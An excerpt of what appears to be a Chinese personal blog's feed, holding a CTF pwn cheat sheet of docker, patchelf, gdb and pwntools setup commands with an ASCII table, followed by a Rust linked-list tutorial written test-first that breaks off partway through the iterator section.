    <content type="html"><![CDATA[<p>整理记录用到的命令，以避免每次用到查一遍</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>docker ps</code>查看运行的容器</p><p><code>docker exec -it ? /bin/bash</code>进入?id的容器终端</p><p><code>chmod +x &lt;file&gt;</code> 增加可执行权限</p><p><code>tty</code> <code>vim ~/.gdbinit</code></p><blockquote><p>set context-output /dev/pts/?</p></blockquote><p>设置gdb输出位置</p><p><code>source /pip_venv/bin/activate</code>进入python虚拟环境</p><p><code>tmux</code>进入tmux终端</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>很多时候需要和远程统一库函数，以及符合要求的ld</p><p><code>ldd pwn</code>查看pwn文件的链接情况</p><p><code>patchelf --replace-needed libc.so.6 ./libc.so.6 pwn</code>用当前文件夹下的libc.so.6替换pwn需要的链接库<br><code>patchelf --replace-needed ./libc.so.6 libc.so.6 pwn</code>改回系统链接库</p><p><code>strings ./libc.so.6 | grep GNU</code> 查找符合要求的ld版本信息，如果题目提供的话就不需要了</p><p><code>patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn</code> 设置解释器为当前路径下的，恢复默认：<code>patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 pwn</code></p><p>或者用glibc-all-in-one的话<code>patchelf --set-interpreter /workspace/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so pwn</code></p><p><code>patchelf --set-rpath . pwn</code> 设置链接库路径，逆过程：<code>patchelf --remove-rpath pwn</code></p><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>开始调试程序：直接跟着待调试文件名，比如：<code>gdb pwn</code></p><p><code>start</code>寻找程序入口并中断</p><p><code>run</code>运行程序到断点或结束，可加参数</p><p><code>next</code>或简写<code>n</code>运行下一行代码，<code>nexti</code>或<code>ni</code>，运行下一行指令，汇编层面的一行，<code>step</code>或<code>s</code>，下一行代码，遇到函数时会步入，<code>stepi</code>或<code>si</code>运行下一行汇编级的指令，遇到函数会步入。程序的函数就si，遇到库函数就ni</p><p><code>info register</code>或<code>i r</code>查看当前寄存器信息</p><p><code>i address xx</code>查看函数地址</p><p><code>disass xxx</code>反汇编某处的指令</p><p><code>break xxx</code>在某处下断点，<code>info break</code>或<code>i b</code>查看当前所有断点信息。可以在指定函数处<code>b printf</code>或者地址<code>b *0x40127D</code></p><p><code>vmmap</code>查看内存分配情况</p><p><code>checksec</code>查看程序保护机制，NX等</p><p><code>quit</code>退出</p><p><code>x/s 0x?</code>以字符串查看指定位置内容</p><p><code>x/20gx $rsp</code>查看rsp以下20个8字节数据（16进制）</p><p><code>finish</code>执行到退出当前函数</p><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>context(arch=’amd64’, os=’linux’, log_level=’debug’)</p><p>context.terminal=[‘tmux’,’splitw’,’-h’]</p><h2 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h2><h3 id="控制字符-0-31"><a href="#控制字符-0-31" class="headerlink" title="控制字符 (0-31)"></a>控制字符 (0-31)</h3><div class="table-container"><table><thead><tr><th>十进制</th><th>十六进制</th><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>00</td><td>NUL</td><td>空字符</td></tr><tr><td>1</td><td>01</td><td>SOH</td><td>标题开始</td></tr><tr><td>2</td><td>02</td><td>STX</td><td>正文开始</td></tr><tr><td>3</td><td>03</td><td>ETX</td><td>正文结束</td></tr><tr><td>4</td><td>04</td><td>EOT</td><td>传输结束</td></tr><tr><td>5</td><td>05</td><td>ENQ</td><td>询问</td></tr><tr><td>6</td><td>06</td><td>ACK</td><td>收到通知</td></tr><tr><td>7</td><td>07</td><td>BEL</td><td>铃</td></tr><tr><td>8</td><td>08</td><td>BS</td><td>退格</td></tr><tr><td>9</td><td>09</td><td>HT</td><td>水平制表符</td></tr><tr><td>10</td><td>0A</td><td>LF</td><td>换行键</td></tr><tr><td>11</td><td>0B</td><td>VT</td><td>垂直制表符</td></tr><tr><td>12</td><td>0C</td><td>FF</td><td>换页键</td></tr><tr><td>13</td><td>0D</td><td>CR</td><td>回车键</td></tr><tr><td>14</td><td>0E</td><td>SO</td><td>移出</td></tr><tr><td>15</td><td>0F</td><td>SI</td><td>移入</td></tr><tr><td>16</td><td>10</td><td>DLE</td><td>数据链路转义</td></tr><tr><td>17</td><td>11</td><td>DC1</td><td>设备控制 1</td></tr><tr><td>18</td><td>12</td><td>DC2</td><td>设备控制 2</td></tr><tr><td>19</td><td>13</td><td>DC3</td><td>设备控制 3</td></tr><tr><td>20</td><td>14</td><td>DC4</td><td>设备控制 4</td></tr><tr><td>21</td><td>15</td><td>NAK</td><td>拒绝接收</td></tr><tr><td>22</td><td>16</td><td>SYN</td><td>同步空闲</td></tr><tr><td>23</td><td>17</td><td>ETB</td><td>传输块结束</td></tr><tr><td>24</td><td>18</td><td>CAN</td><td>取消</td></tr><tr><td>25</td><td>19</td><td>EM</td><td>介质中断</td></tr><tr><td>26</td><td>1A</td><td>SUB</td><td>替换</td></tr><tr><td>27</td><td>1B</td><td>ESC</td><td>换码符</td></tr><tr><td>28</td><td>1C</td><td>FS</td><td>文件分隔符</td></tr><tr><td>29</td><td>1D</td><td>GS</td><td>组分隔符</td></tr><tr><td>30</td><td>1E</td><td>RS</td><td>记录分离符</td></tr><tr><td>31</td><td>1F</td><td>US</td><td>单元分隔符</td></tr></tbody></table></div><h3 id="可打印字符-32-127"><a href="#可打印字符-32-127" class="headerlink" title="可打印字符 (32-127)"></a>可打印字符 (32-127)</h3><div class="table-container"><table><thead><tr><th>十进制</th><th>十六进制</th><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>32</td><td>20</td><td>(空格)</td><td>空格</td></tr><tr><td>33</td><td>21</td><td>!</td><td>感叹号</td></tr><tr><td>34</td><td>22</td><td>“</td><td>双引号</td></tr><tr><td>35</td><td>23</td><td>#</td><td>井号</td></tr><tr><td>36</td><td>24</td><td>$</td><td>美元符</td></tr><tr><td>37</td><td>25</td><td>%</td><td>百分号</td></tr><tr><td>38</td><td>26</td><td>&amp;</td><td>与</td></tr><tr><td>39</td><td>27</td><td>‘</td><td>单引号</td></tr><tr><td>40</td><td>28</td><td>(</td><td>左括号</td></tr><tr><td>41</td><td>29</td><td>)</td><td>右括号</td></tr><tr><td>42</td><td>2A</td><td>*</td><td>星号</td></tr><tr><td>43</td><td>2B</td><td>+</td><td>加号</td></tr><tr><td>44</td><td>2C</td><td>,</td><td>逗号</td></tr><tr><td>45</td><td>2D</td><td>-</td><td>连字号或减号</td></tr><tr><td>46</td><td>2E</td><td>.</td><td>句点或小数点</td></tr><tr><td>47</td><td>2F</td><td>/</td><td>斜杠</td></tr><tr><td>48</td><td>30</td><td>0</td><td>0</td></tr><tr><td>49</td><td>31</td><td>1</td><td>1</td></tr><tr><td>50</td><td>32</td><td>2</td><td>2</td></tr><tr><td>51</td><td>33</td><td>3</td><td>3</td></tr><tr><td>52</td><td>34</td><td>4</td><td>4</td></tr><tr><td>53</td><td>35</td><td>5</td><td>5</td></tr><tr><td>54</td><td>36</td><td>6</td><td>6</td></tr><tr><td>55</td><td>37</td><td>7</td><td>7</td></tr><tr><td>56</td><td>38</td><td>8</td><td>8</td></tr><tr><td>57</td><td>39</td><td>9</td><td>9</td></tr><tr><td>58</td><td>3A</td><td>:</td><td>冒号</td></tr><tr><td>59</td><td>3B</td><td>;</td><td>分号</td></tr><tr><td>60</td><td>3C</td><td>&lt;</td><td>小于</td></tr><tr><td>61</td><td>3D</td><td>=</td><td>等号</td></tr><tr><td>62</td><td>3E</td><td>&gt;</td><td>大于</td></tr><tr><td>63</td><td>3F</td><td>?</td><td>问号</td></tr><tr><td>64</td><td>40</td><td>@</td><td>电子邮件符号</td></tr><tr><td>65</td><td>41</td><td>A</td><td>大写字母 A</td></tr><tr><td>66</td><td>42</td><td>B</td><td>大写字母 B</td></tr><tr><td>67</td><td>43</td><td>C</td><td>大写字母 C</td></tr><tr><td>68</td><td>44</td><td>D</td><td>大写字母 D</td></tr><tr><td>69</td><td>45</td><td>E</td><td>大写字母 E</td></tr><tr><td>70</td><td>46</td><td>F</td><td>大写字母 F</td></tr><tr><td>71</td><td>47</td><td>G</td><td>大写字母 G</td></tr><tr><td>72</td><td>48</td><td>H</td><td>大写字母 H</td></tr><tr><td>73</td><td>49</td><td>I</td><td>大写字母 I</td></tr><tr><td>74</td><td>4A</td><td>J</td><td>大写字母 J</td></tr><tr><td>75</td><td>4B</td><td>K</td><td>大写字母 K</td></tr><tr><td>76</td><td>4C</td><td>L</td><td>大写字母 L</td></tr><tr><td>77</td><td>4D</td><td>M</td><td>大写字母 M</td></tr><tr><td>78</td><td>4E</td><td>N</td><td>大写字母 N</td></tr><tr><td>79</td><td>4F</td><td>O</td><td>大写字母 O</td></tr><tr><td>80</td><td>50</td><td>P</td><td>大写字母 P</td></tr><tr><td>81</td><td>51</td><td>Q</td><td>大写字母 Q</td></tr><tr><td>82</td><td>52</td><td>R</td><td>大写字母 R</td></tr><tr><td>83</td><td>53</td><td>S</td><td>大写字母 S</td></tr><tr><td>84</td><td>54</td><td>T</td><td>大写字母 T</td></tr><tr><td>85</td><td>55</td><td>U</td><td>大写字母 U</td></tr><tr><td>86</td><td>56</td><td>V</td><td>大写字母 V</td></tr><tr><td>87</td><td>57</td><td>W</td><td>大写字母 W</td></tr><tr><td>88</td><td>58</td><td>X</td><td>大写字母 X</td></tr><tr><td>89</td><td>59</td><td>Y</td><td>大写字母 Y</td></tr><tr><td>90</td><td>5A</td><td>Z</td><td>大写字母 Z</td></tr><tr><td>91</td><td>5B</td><td>[</td><td>左中括号</td></tr><tr><td>92</td><td>5C</td><td>\</td><td>反斜杠</td></tr><tr><td>93</td><td>5D</td><td>]</td><td>右中括号</td></tr><tr><td>94</td><td>5E</td><td>^</td><td>音调符号</td></tr><tr><td>95</td><td>5F</td><td>_</td><td>下划线</td></tr><tr><td>96</td><td>60</td><td>`</td><td>重音符</td></tr><tr><td>97</td><td>61</td><td>a</td><td>小写字母 a</td></tr><tr><td>98</td><td>62</td><td>b</td><td>小写字母 b</td></tr><tr><td>99</td><td>63</td><td>c</td><td>小写字母 c</td></tr><tr><td>100</td><td>64</td><td>d</td><td>小写字母 d</td></tr><tr><td>101</td><td>65</td><td>e</td><td>小写字母 e</td></tr><tr><td>102</td><td>66</td><td>f</td><td>小写字母 f</td></tr><tr><td>103</td><td>67</td><td>g</td><td>小写字母 g</td></tr><tr><td>104</td><td>68</td><td>h</td><td>小写字母 h</td></tr><tr><td>105</td><td>69</td><td>i</td><td>小写字母 i</td></tr><tr><td>106</td><td>6A</td><td>j</td><td>小写字母 j</td></tr><tr><td>107</td><td>6B</td><td>k</td><td>小写字母 k</td></tr><tr><td>108</td><td>6C</td><td>l</td><td>小写字母 l</td></tr><tr><td>109</td><td>6D</td><td>m</td><td>小写字母 m</td></tr><tr><td>110</td><td>6E</td><td>n</td><td>小写字母 n</td></tr><tr><td>111</td><td>6F</td><td>o</td><td>小写字母 o</td></tr><tr><td>112</td><td>70</td><td>p</td><td>小写字母 p</td></tr><tr><td>113</td><td>71</td><td>q</td><td>小写字母 q</td></tr><tr><td>114</td><td>72</td><td>r</td><td>小写字母 r</td></tr><tr><td>115</td><td>73</td><td>s</td><td>小写字母 s</td></tr><tr><td>116</td><td>74</td><td>t</td><td>小写字母 t</td></tr><tr><td>117</td><td>75</td><td>u</td><td>小写字母 u</td></tr><tr><td>118</td><td>76</td><td>v</td><td>小写字母 v</td></tr><tr><td>119</td><td>77</td><td>w</td><td>小写字母 w</td></tr><tr><td>120</td><td>78</td><td>x</td><td>小写字母 x</td></tr><tr><td>121</td><td>79</td><td>y</td><td>小写字母 y</td></tr><tr><td>122</td><td>7A</td><td>z</td><td>小写字母 z</td></tr><tr><td>123</td><td>7B</td><td>{</td><td>左大括号</td></tr><tr><td>124</td><td>7C</td><td>I</td><td>垂直线</td></tr><tr><td>125</td><td>7D</td><td>}</td><td>右大括号</td></tr><tr><td>126</td><td>7E</td><td>~</td><td>波浪号</td></tr><tr><td>127</td><td>7F</td><td>DEL</td><td>删除</td></tr></tbody></table></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;整理记录用到的命令，以避免每次用到查一遍&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;&lt;code&gt;docker</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>手搓一个简单的链表</title>
    <link href="https://aucept.in/2025/08/31/%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
    <id>https://aucept.in/2025/08/31/%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E9%93%BE%E8%A1%A8/</id>
    <published>2025-08-31T05:40:11.000Z</published>
    <updated>2025-09-03T14:06:01.832Z</updated>
    
    <content type="html"><![CDATA[<p>已经学习rust一周了，是时候尝试一下链表了</p><p>按照TDD的规范，先写第一个测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">//lib.rs</span><span class="token attribute attr-name">#[cfg(test)]</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token operator">*</span><span class="token punctuation">;</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_list_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> list <span class="token punctuation">:</span> <span class="token class-name">List</span> <span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">isempty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>第一个细节是 <code>use super::*</code>，rust项目在一个crate里的组织是以mod为单元的，也就是说虽然tests模块写在了lib.rs，它和直接写在lib.rs里的函数仍然是分离的。<code>use super::*</code>表示把父模块的全部方法引入进当前模块</p><p>接下来定义List结构体，完成new和isempty方法<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">//lib.rs</span><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">List</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    head <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token punctuation">&#123;</span>head <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">isempty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span><span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>Option&lt;Box&lt;Node&lt;T&gt;&gt;&gt;</code>，好冗长的东西。head应该是一个指向链表首地址的指针，而链表的本体要放在堆上。Box用来封装到堆上，类型是，元素为T类型的节点<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">type</span> <span class="token type-definition class-name">Link</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token operator">>></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>所以补充这一行简化代码</p><p>另一个细节是<code>impl&lt;T&gt; List&lt;T&gt;</code>这里有两个&lt; T>，第一个是声明这里要用到一个泛型模板T，第二个则是跟着每个List出现的类型说明</p><p>该写下一个测试了，关于pop和push方法，仅在头部进出元素：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/*other tests*/</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_list_push_and_pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token punctuation">:</span> <span class="token class-name">List</span> <span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">336699</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">336699</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>如下：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/*existing code*/</span>    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span>val <span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>val <span class="token punctuation">:</span> val<span class="token punctuation">,</span>next <span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>head <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>head <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            node<span class="token punctuation">.</span>val        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>Option类型的take方法，可以把其中的值取出来。map方法，对取出来的值进行一个闭包形式的操作。这里take出来一个作为参数node，给self重新赋值</p><p>以上逻辑看着很理所当然，实际上却没有那么简单。试想如果写成:<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head <span class="token punctuation">&#123;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>head <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>val<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">None</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>编译器就会提醒self是不可移动的，因为<code>let Some(node) = self.head</code>涉及所有权的转移，而take方法在把值转移出去之后会补充一个None以避免安全问题。</p><p>那么，下一个测试要实现peek函数功能，返回头节点的引用：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">peek</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>val    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>as_ref()</code>方法是必须的，因为函数返回了一个内部的引用，这可太危险了，参数出了函数就没了，而引用（指针）还在。</p><p>接下来是迭代器，rust中分为三种，移交所有权的，借用型的和可变借用型的。</p><p>首先实现转移所有权的into版本，还是先写测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_into_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">into_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token 